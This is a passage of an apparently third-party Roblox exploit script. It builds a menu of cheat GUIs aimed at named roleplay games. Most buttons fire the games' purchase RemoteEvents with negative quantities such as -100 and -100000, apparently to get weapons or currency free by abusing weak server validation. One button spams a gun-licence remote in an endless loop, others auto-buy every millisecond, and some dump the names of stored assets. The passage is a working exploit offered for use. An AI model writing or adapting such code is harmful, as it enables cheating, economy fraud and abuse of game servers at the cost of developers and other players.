        btn.TextColor3 = Color3.fromRGB(0, 255, 0)
        btn.Text = " Copied: " .. tool.Name
        task.wait(0.8)
        btn.Text = " " .. tool.Name
        btn.TextColor3 = Color3.fromRGB(0,0,0)
    end)
end

local function rebuildList()
    clearList()
    local tools = {}
    for _, inst in ipairs(storageSystem:GetDescendants()) do
        if inst:IsA("Tool") then
            table.insert(tools, inst)
        end
    end
    table.sort(tools, function(a,b) return a.Name:lower() < b.Name:lower() end)
    for _, t in ipairs(tools) do
        addToolLine(t)
    end
    scrolling.CanvasSize = UDim2.new(0, 0, 0, #tools * 32)
end

--// Build + Live Update
rebuildList()
storageSystem.DescendantAdded:Connect(function(obj)
    if obj:IsA("Tool") then rebuildList() end
end)
storageSystem.DescendantRemoving:Connect(function(obj)
    if obj:IsA("Tool") then rebuildList() end
end)

--// Toggle GUI visibility with "K"
local visible = true
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode == Enum.KeyCode.K then
		visible = not visible
		gui.Enabled = visible
	end
end)

print("✅ StorageSystem Tools Viewer loaded (Press O to toggle, click to copy).")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BAGONG BARYO OPEN THIS + BUY ITEM REMOTE (MONSY)", function()
	-- LocalScript: GunEngineAssets.WeaponModels Viewer (NO DUPLICATES)
-- Place in StarterPlayer > StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Wait for path
local gunEngine = ReplicatedStorage:WaitForChild("GunEngineAssets", 5)
local weaponModels = gunEngine and gunEngine:WaitForChild("WeaponModels", 5)
if not weaponModels then
	warn("GunEngineAssets.WeaponModels not found!")
	return
end

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 450, 0, 420)
frame.Position = UDim2.new(0.5, -225, 0.25, 0)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "WeaponModels Viewer"
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Parent = titleBar

-- Info
local info = Instance.new("TextLabel")
info.Size = UDim2.new(1, -20, 0, 20)
info.Position = UDim2.new(0, 10, 0, 40)
info.BackgroundTransparency = 1
info.Text = "Click to copy name | Press O to toggle"
info.Font = Enum.Font.Roboto
info.TextSize = 13
info.TextColor3 = Color3.fromRGB(180, 180, 180)
info.TextXAlignment = Enum.TextXAlignment.Left
info.Parent = frame

-- Scrolling
local scrolling = Instance.new("ScrollingFrame")
scrolling.Size = UDim2.new(1, -20, 1, -75)
scrolling.Position = UDim2.new(0, 10, 0, 65)
scrolling.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scrolling.BorderSizePixel = 0
scrolling.ScrollBarThickness = 6
scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
scrolling.Parent = frame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 8)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrolling

-- Copy
local function copy(text)
	if setclipboard then setclipboard(text)
	elseif writeclipboard then writeclipboard(text) end
end

-- Clear
local function clear()
	for _, v in scrolling:GetChildren() do
		if v:IsA("GuiObject") then v:Destroy() end
	end
end

-- Icon
local function getIcon(obj)
	if obj:IsA("Tool") then return "Tool"
	elseif obj:IsA("Model") then return "Model"
	elseif obj:IsA("Folder") then return "Folder"
	elseif obj:IsA("Part") then return "Part"
	else return "Item"
	end
end

-- Add Header
local function addHeader(name)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(1, -10, 0, 30)
	lbl.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	lbl.Text = " " .. name
	lbl.Font = Enum.Font.Roboto
	lbl.TextSize = 14
	lbl.TextColor3 = Color3.fromRGB(100, 200, 255)
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Parent = scrolling

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 6)
	c.Parent = lbl
end

-- Add Item
local function addItem(item)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -20, 0, 28)
	btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Font = Enum.Font.Roboto
	btn.TextSize = 13
	btn.Text = "   " .. getIcon(item) .. " " .. item.Name
	btn.AutoButtonColor = false
	btn.Parent = scrolling

	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, 5)
	c.Parent = btn

	-- Hover
	btn.MouseEnter:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(35, 35, 35) end)
	btn.MouseLeave:Connect(function() btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end)

	-- Click to copy
	btn.MouseButton1Click:Connect(function()
		copy(item.Name)
		local oldText = btn.Text
		btn.TextColor3 = Color3.fromRGB(0, 255, 0)
		btn.Text = "   Copied: " .. item.Name
		task.wait(0.7)
		btn.Text = oldText
		btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	end)
end

-- Rebuild (NO DUPLICATES)
local function rebuild()
	clear()

	local seen = {}  -- Prevent duplicates
	local folderMap = {}

	-- Only scan direct children of WeaponModels
	for _, child in ipairs(weaponModels:GetChildren()) do
		local name = child.Name
		if not seen[name] then
			seen[name] = true

			if child:IsA("Folder") then
				-- Folder → collect its children
				folderMap[child.Name] = folderMap[child.Name] or {}
				for _, item in ipairs(child:GetChildren()) do
					table.insert(folderMap[child.Name], item)
				end
			else
				-- Direct item → put in "Main"
				folderMap["Main"] = folderMap["Main"] or {}
				table.insert(folderMap["Main"], child)
			end
		end
	end

	-- Sort folders
	local folders = {}
	for folderName, _ in pairs(folderMap) do
		table.insert(folders, folderName)
	end
	table.sort(folders)

	-- Build UI
	local y = 0
	for _, folderName in ipairs(folders) do
		local items = folderMap[folderName]
		if #items > 0 then
			addHeader(folderName)
			y += 38

			table.sort(items, function(a,b) return a.Name:lower() < b.Name:lower() end)

			for _, item in ipairs(items) do
				addItem(item)
				y += 36
			end
		end
	end

	scrolling.CanvasSize = UDim2.new(0, 0, 0, y + 20)
end

-- Initial
task.spawn(rebuild)

-- Live Update (debounced)
local updating = false
local function update()
	if updating then return end
	updating = true
	task.wait(0.2)
	rebuild()
	updating = false
end

weaponModels.ChildAdded:Connect(update)
weaponModels.ChildRemoved:Connect(update)
weaponModels.DescendantAdded:Connect(update)
weaponModels.DescendantRemoving:Connect(update)

-- Toggle O
local visible = true
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.O then
		visible = not visible
		gui.Enabled = visible
	end
end)

print("BURAT MONSY")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("BUYITEM REMOTE FOR ALL CITY (MONSY)", function()
    -- LocalScript: All-black draggable BUY GUI (centered title + auto-clear textboxes)
-- Place this in StarterGui or StarterPlayerScripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Find the remote to use
local buyRemote = ReplicatedStorage:FindFirstChild("BuyItemRemote") or ReplicatedStorage:FindFirstChild("AntiExploit")

--// GUI
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

--// Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

--// Item Name TextBox
local itemBox = Instance.new("TextBox", frame)
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 55)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
itemBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
itemBox.TextColor3 = Color3.fromRGB(0,0,0)
itemBox.Font = Enum.Font.Roboto
itemBox.TextSize = 14
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)
itemBox.ClearTextOnFocus = true -- auto clear when clicked

--// Amount TextBox
local amountBox = Instance.new("TextBox", frame)
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 100)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)
amountBox.ClearTextOnFocus = true -- auto clear when clicked

--// Send Button
local sendButton = Instance.new("TextButton", frame)
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 145)
sendButton.Text = "BUY"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.Roboto
sendButton.TextSize = 16
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Feedback Text
local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Roboto
feedback.TextSize = 12
feedback.TextColor3 = Color3.fromRGB(200, 200, 200)
feedback.Text = ""

local function showFeedback(msg, t)
	feedback.Text = msg
	task.delay(t or 2, function()
		if feedback then feedback.Text = "" end
	end)
end

--// Buy Logic
local function buyItem()
	local item = itemBox.Text
	local amount = tonumber(amountBox.Text)

	if item == "" or not amount then
		showFeedback("Invalid input!", 2)
		return
	end

	if not buyRemote then
		showFeedback("Remote not found!", 2)
		return
	end

	buyRemote:FireServer(item, amount)
	showFeedback("Sent: " .. item .. " x" .. amount, 2)
end

sendButton.MouseButton1Click:Connect(buyItem)
itemBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
amountBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)

-- Hover effect (slight brightening)
sendButton.MouseEnter:Connect(function()
	sendButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
end)
sendButton.MouseLeave:Connect(function()
	sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP REMOTE FOR ALL CITY (MONSY)", function()
    -- LocalScript: PUBLIC ENEMY CASH MENU (GunShop Purchase System)
-- Place inside StarterGui or StarterPlayerScripts

--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Remote setup
local purchaseEvent = ReplicatedStorage:WaitForChild("GunShop"):WaitForChild("Events"):WaitForChild("Purchase")

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 18
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextYAlignment = Enum.TextYAlignment.Center

--// Item Name TextBox
local itemBox = Instance.new("TextBox", frame)
itemBox.Size = UDim2.new(1, -20, 0, 35)
itemBox.Position = UDim2.new(0, 10, 0, 55)
itemBox.PlaceholderText = "Enter Item Name"
itemBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
itemBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
itemBox.TextColor3 = Color3.fromRGB(0,0,0)
itemBox.Font = Enum.Font.Roboto
itemBox.TextSize = 14
itemBox.ClearTextOnFocus = true
Instance.new("UICorner", itemBox).CornerRadius = UDim.new(0, 6)

--// Amount TextBox
local amountBox = Instance.new("TextBox", frame)
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 100)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 14
amountBox.ClearTextOnFocus = true
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// BUY Button
local buyButton = Instance.new("TextButton", frame)
buyButton.Size = UDim2.new(1, -20, 0, 40)
buyButton.Position = UDim2.new(0, 10, 0, 145)
buyButton.Text = "BUY"
buyButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
buyButton.TextColor3 = Color3.fromRGB(0,0,0)
buyButton.Font = Enum.Font.Roboto
buyButton.TextSize = 16
Instance.new("UICorner", buyButton).CornerRadius = UDim.new(0, 6)

-- Hover animation
buyButton.MouseEnter:Connect(function()
	buyButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
end)
buyButton.MouseLeave:Connect(function()
	buyButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
end)

-- Feedback label
local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, -20, 0, 20)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Roboto
feedback.TextSize = 12
feedback.TextColor3 = Color3.fromRGB(200, 200, 200)
feedback.Text = ""

-- Feedback function
local function showFeedback(msg, t)
	feedback.Text = msg
	task.delay(t or 2, function()
		if feedback then feedback.Text = "" end
	end)
end

-- Purchase Logic
local function buyItem()
	local item = itemBox.Text
	local amount = tonumber(-amountBox.Text)

	if item == "" or not amount then
		showFeedback("Invalid item or amount!", 2)
		return
	end

	purchaseEvent:FireServer(item, amount)
	showFeedback("Sent: " .. item .. " x" .. amount, 2)
end

buyButton.MouseButton1Click:Connect(buyItem)
itemBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
amountBox.FocusLost:Connect(function(enter) if enter then buyItem() end end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("GUNSHOP AUTO BUY (USELESS)", function()
	-- Services
local player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Setup UI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Name = ""
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "GOMA GUN CMDS"
titleLabel.Font = Enum.Font.Roboto
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- White instead of red
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = frame

local textBox = Instance.new("TextBox")
textBox.Name = ""
textBox.Text = ""
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.Roboto
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 24
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Parent = frame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.Roboto
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = frame

-- Commands Table
local commands = {}
local gunEvent = ReplicatedStorage:FindFirstChild("GunShop") and ReplicatedStorage.GunShop:FindFirstChild("Events") and ReplicatedStorage.GunShop.Events:FindFirstChild("Purchase")

commands["BuySilenced"] = function()
	if gunEvent then
		gunEvent:FireServer("Silenced Pistol", -100)
	end
end

commands["BuyGlock17"] = function()
	if gunEvent then
		gunEvent:FireServer("Glock-17", -100)
	end
end

commands["BuyGlock19"] = function()
	if gunEvent then
		gunEvent:FireServer("Glock-19", -100)
	end
end

commands["BuyDeagle"] = function()
	if gunEvent then
		gunEvent:FireServer("Desert Deagle", -100)
	end
end

commands["BuyAmmo"] = function()
	if gunEvent then
		gunEvent:FireServer("AmmoBox", -100)
	end
end

commands["BuyAllGuns"] = function()
	if gunEvent then
		gunEvent:FireServer("Silenced Pistol", -100)
		gunEvent:FireServer("Glock-17", -100)
		gunEvent:FireServer("Glock-19", -100)
		gunEvent:FireServer("Desert Deagle", -100)
		gunEvent:FireServer("AmmoBox", -100)
	end
end

-- Toggle Logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn

	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
		local cmdText = textBox.Text
		local commandFunc = commands[cmdText]
		if commandFunc then
			commandFunc()
		else
			warn("Unknown command: " .. cmdText)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
	end
end)

-- Drag Logic
local dragging = false
local dragInput, mousePos, framePos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		mousePos = input.Position
		framePos = frame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - mousePos
		frame.Position = UDim2.new(
			framePos.X.Scale, framePos.X.Offset + delta.X,
			framePos.Y.Scale, framePos.Y.Offset + delta.Y
		)
	end
end)
end)

addMainMenuButton("URBAN DECAY RP (MONSY)", function()
	-- Services
local player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

-- UI Setup
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = ""
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Name = ""
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Text = "GOMA URBAN GUN BUY"
titleLabel.Font = Enum.Font.Roboto
titleLabel.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
titleLabel.TextSize = 16
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, 0, 0, 20)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.Parent = mainFrame

local textBox = Instance.new("TextBox")
textBox.PlaceholderText = "Enter Command (3KTG)"
textBox.Font = Enum.Font.Roboto
textBox.TextColor3 = Color3.fromRGB(0,0,0)
textBox.TextSize = 20
textBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
textBox.BorderSizePixel = 0
textBox.Size = UDim2.new(0.9, 0, 0, 40)
textBox.Position = UDim2.new(0.05, 0, 0, 40)
textBox.ClearTextOnFocus = false
textBox.Text = ""
textBox.Parent = mainFrame

local toggleButton = Instance.new("TextButton")
toggleButton.Text = "OFF"
toggleButton.Font = Enum.Font.Roboto
toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- Changed from red to white
toggleButton.TextSize = 22
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.BorderSizePixel = 0
toggleButton.Size = UDim2.new(0.6, 0, 0, 35)
toggleButton.Position = UDim2.new(0.2, 0, 0, 95)
toggleButton.Parent = mainFrame

-- Command Table
local purchaseEvent = ReplicatedStorage:WaitForChild("PurchaseEvent")
local commands = {}

commands["BuyAK"] = function()
	purchaseEvent:FireServer("AK-47", -100)
end

commands["BuyAR15"] = function()
	purchaseEvent:FireServer("AR15", -100)
end

commands["BuyVector"] = function()
	purchaseEvent:FireServer("Vector", -100)
end

commands["BuySyringe"] = function()
	purchaseEvent:FireServer("Syringe", -100)
end

commands["BuyP90"] = function()
	purchaseEvent:FireServer("P90", -100)
end

commands["BuyBandage"] = function()
	purchaseEvent:FireServer("Bandage", -100)
end

commands["BuyAmmo1"] = function()
	purchaseEvent:FireServer("AmmoBox_1", -100)
end

commands["BuySten"] = function()
	purchaseEvent:FireServer("Sten Gun", -100)
end

commands["BuyAll2"] = function()
	local items = {
		"AK-47", "AR15", "Vector", "Syringe",
		"P90", "Bandage", "AmmoBox_1", "Sten Gun"
	}
	for _, item in ipairs(items) do
		purchaseEvent:FireServer(item, -100)
	end
end

-- Toggle Logic
local isOn = false

toggleButton.MouseButton1Click:Connect(function()
	isOn = not isOn
	if isOn then
		toggleButton.Text = "ON"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
		local inputCmd = textBox.Text
		local func = commands[inputCmd]
		if func then
			func()
		else
			warn("Unknown command: " .. inputCmd)
		end
	else
		toggleButton.Text = "OFF"
		toggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- White when OFF
	end
end)

-- Optional: Drag support
local dragging, dragInput, startPos, startFramePos
mainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		startPos = input.Position
		startFramePos = mainFrame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

mainFrame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
		local delta = input.Position - startPos
		mainFrame.Position = UDim2.new(
			startFramePos.X.Scale, startFramePos.X.Offset + delta.X,
			startFramePos.Y.Scale, startFramePos.Y.Offset + delta.Y
		)
	end
end)
end)

addMainMenuButton("LICENCE GIVER SYSTEM (MONSY)", function()
	while true do game:GetService("ReplicatedStorage").GunLicenseGiver:FireServer("User",0.1)
wait()
end
end)

addMainMenuButton("PROMINENCE CITY S1 SPAWN GUN (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PROMINENCE CITY S1"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {".50", ".50"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.GivePistolBox:FireServer(selectedItem, -100000)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(0.001)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("URBAN CITY SPAWN GUN V3 (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200) -- Adjusted to fit just 2 items
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
